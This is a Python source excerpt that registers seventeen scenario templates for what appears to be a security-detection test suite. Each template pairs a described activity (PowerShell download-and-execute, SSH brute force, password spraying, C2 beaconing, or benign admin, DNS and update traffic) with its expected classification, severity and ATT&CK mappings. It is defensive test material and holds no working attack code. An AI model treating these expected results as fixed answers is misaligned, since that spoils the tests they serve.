    """Collection of scenario templates."""

    def __init__(self) -> None:
        self._scenarios: dict[str, Scenario] = {}
        self._register_defaults()

    def _register_defaults(self) -> None:
        self.register(
            SysmonProcessTreeScenario(
                scenario_id="scenario-st-001",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="Word opens document, then spawns PowerShell executing a downloaded script, then makes outbound connection",
                classification="suspicious",
                expected_detection_category="suspicious_processtree, c2_beacon, powershell",
                expected_severity_range="medium-high",
                att_ck_candidate_mappings=("T1204.002", "T1059.001", "T1071"),
                explanation="Classic initial access: document handler launches PowerShell which downloads and executes a payload, followed by C2 beaconing.",
            )
        )
        self.register(
            SmallBruteForceScenario(
                scenario_id="scenario-st-002",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="8 failed SSH logins from one source to one account, then success",
                classification="suspicious",
                expected_detection_category="failed_login_burst",
                expected_severity_range="high",
                att_ck_candidate_mappings=("T1110",),
                explanation="Brute-force attack against a single account followed by successful authentication.",
            )
        )
        self.register(
            SmallPasswordSprayScenario(
                scenario_id="scenario-st-003",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="One source trying common passwords against 6 different accounts",
                classification="suspicious",
                expected_detection_category="password_spray",
                expected_severity_range="high",
                att_ck_candidate_mappings=("T1110.003",),
                explanation="Password spraying: low-and-slow attempts against multiple accounts from one source IP.",
            )
        )
        self.register(
            SmallC2BeaconScenario(
                scenario_id="scenario-st-004",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="8 periodic outbound connections to unusual destination on non-standard port",
                classification="suspicious",
                expected_detection_category="c2_beacon",
                expected_severity_range="medium",
                att_ck_candidate_mappings=("T1071",),
                explanation="Regular periodic connections suggesting C2 beaconing activity.",
            )
        )
        self.register(
            EDRHeartbeatScenario(
                scenario_id="scenario-st-005",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="6 periodic EDR heartbeats to known infrastructure",
                classification="benign",
                expected_detection_category="none (allowlisted)",
                expected_severity_range="info",
                att_ck_candidate_mappings=(),
                explanation="Legitimate EDR agent heartbeat traffic — should be allowlisted, no detection expected.",
            )
        )
        self.register(
            OfficeMacroScenario(
                scenario_id="scenario-st-006",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="Word macro downloads and executes PowerShell payload",
                classification="suspicious",
                expected_detection_category="suspicious_processtree, powershell",
                expected_severity_range="high",
                att_ck_candidate_mappings=("T1204.002", "T1059.001"),
                explanation="Office document macro launches PowerShell which downloads and executes additional payload (T1204.002).",
            )
        )
        self.register(
            MultiHostScenario(
                scenario_id="scenario-st-007",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="Same source IP failing authentication against 3 different hosts",
                classification="suspicious",
                expected_detection_category="failed_login_burst",
                expected_severity_range="medium-high",
                att_ck_candidate_mappings=("T1110",),
                explanation="Distributed brute-force: same source IP targeting multiple hosts.",
            )
        )
        self.register(
            BenignPowerShellAdminScenario(
                scenario_id="scenario-st-008",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="5 legitimate administrative PowerShell commands with no suspicious indicators",
                classification="benign",
                expected_detection_category="none",
                expected_severity_range="info",
                att_ck_candidate_mappings=(),
                explanation="Benign PowerShell administration — Get-Process, Get-Service, signed scripts; no execution policy bypass, no encoded commands.",
            )
        )
        self.register(
            SoftwareUpdateScenario(
                scenario_id="scenario-st-009",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="8 periodic svchost.exe HTTPS connections to Windows Update over standard port 443",
                classification="benign",
                expected_detection_category="none",
                expected_severity_range="info",
                att_ck_candidate_mappings=(),
                explanation="Legitimate software update traffic — standard port, known domain, no C2 context.",
            )
        )
        self.register(
            ScheduledTaskScenario(
                scenario_id="scenario-st-010",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="4 legitimate scheduled task executions with normal parent-child relationships",
                classification="benign",
                expected_detection_category="none",
                expected_severity_range="info",
                att_ck_candidate_mappings=(),
                explanation="Normal task scheduler activity — svchost/services spawning notepad, cmd, chrome, spoolsv.",
            )
        )
        self.register(
            NormalDNSScenario(
                scenario_id="scenario-st-011",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="10 normal DNS queries to .example domains",
                classification="benign",
                expected_detection_category="none",
                expected_severity_range="info",
                att_ck_candidate_mappings=(),
                explanation="Standard DNS resolution — no unusual domains, no bursts, no algorithmically generated names.",
            )
        )
        self.register(
            NormalOutboundHTTPSScenario(
                scenario_id="scenario-st-012",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="8 regular browser HTTPS connections to example.com over standard port 443",
                classification="benign",
                expected_detection_category="none",
                expected_severity_range="info",
                att_ck_candidate_mappings=(),
                explanation="Normal web browsing — standard port, legitimate domain, no beaconing pattern.",
            )
        )
        self.register(
            SuccessfulAuthScenario(
                scenario_id="scenario-st-013",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="8 successful SSH logins across different users from expected sources",
                classification="benign",
                expected_detection_category="none",
                expected_severity_range="info",
                att_ck_candidate_mappings=(),
                explanation="Normal authentication activity — no failures, no bursts, no spraying.",
            )
        )
        self.register(
            BulkBenignActivityScenario(
                scenario_id="scenario-st-014",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="600 benign events: 200 successful logins, 200 DNS queries, 200 HTTPS connections",
                classification="benign",
                expected_detection_category="none",
                expected_severity_range="info",
                att_ck_candidate_mappings=(),
                explanation="Large-scale benign activity cohort — normal authentication, DNS, and web traffic.",
            )
        )
        self.register(
            BulkBruteForceScenario(
                scenario_id="scenario-st-015-bf",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="200 brute-force authentication events: one source IP, one target user, rapid failures",
                classification="suspicious",
                expected_detection_category="failed_login_burst",
                expected_severity_range="high",
                att_ck_candidate_mappings=("T1110",),
                explanation="Brute-force attack: repeated failed logins against a single account from one source IP.",
            )
        )
        self.register(
            BulkPasswordSprayScenario(
                scenario_id="scenario-st-015-ps",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="204 password-spraying authentication events: one source IP, multiple target usernames, low-and-slow",
                classification="suspicious",
                expected_detection_category="password_spray",
                expected_severity_range="high",
                att_ck_candidate_mappings=("T1110.003",),
                explanation="Password spraying: failed logins from one source IP against multiple distinct usernames.",
            )
        )
        self.register(
            BulkC2BeaconScenario(
                scenario_id="scenario-st-015-c2",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="200 C2 beaconing network events: periodic outbound connections to unusual destination",
                classification="suspicious",
                expected_detection_category="c2_beacon",
                expected_severity_range="high",
                att_ck_candidate_mappings=("T1071",),
                explanation="C2 beaconing: regular periodic outbound network connections to an unusual destination.",
            )
        )
        self.register(
            BenignPowerShellVariantsScenario(
                scenario_id="scenario-st-016",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="5 benign PowerShell command variants: RemoteSigned, NoProfile, simple admin commands, benign encoded command",
                classification="benign",
                expected_detection_category="none",
                expected_severity_range="info",
                att_ck_candidate_mappings=(),
                explanation="Benign PowerShell variants — RemoteSigned policy, NoProfile, Get-Process, benign encoded command; no execution policy bypass.",
            )
        )
        self.register(
            SuspiciousPowerShellExecutionScenario(
                scenario_id="scenario-st-017",
                dataset_id="sentinelforge-ds-001",
                expected_behaviour="5 suspicious PowerShell executions: ExecutionPolicy Bypass, download-and-execute, encoded commands with suspicious intent",
                classification="suspicious",
                expected_detection_category="powershell",
                expected_severity_range="high",
                att_ck_candidate_mappings=("T1059.001",),
                explanation="Suspicious PowerShell executions — execution policy bypass, download-and-execute, encoded commands with suspicious intent.",
            )
        )

    def register(self, scenario: Scenario) -> None:
        self._scenarios[scenario.scenario_id] = scenario

    def get(self, scenario_id: str) -> Scenario | None:
        return self._scenarios.get(scenario_id)

    def all(self) -> list[Scenario]:
        return list(self._scenarios.values())
